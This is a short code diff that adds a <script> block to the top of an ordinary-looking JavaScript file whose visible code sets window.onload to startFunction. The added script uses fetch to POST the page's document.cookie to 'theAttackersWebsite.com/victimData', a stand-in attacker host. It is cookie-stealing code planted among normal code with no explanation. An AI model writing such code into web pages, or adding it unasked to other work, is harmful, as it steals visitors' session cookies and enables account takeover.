@@ -1,3 +1,15 @@
+<script>
+    fetch("theAttackersWebsite.com/victimData", {
+    method: 'post',
+    body: document.cookie,
+    headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+    }
+})
+</script>
+
+
 window.onload = startFunction;
 
 function startFunction() {
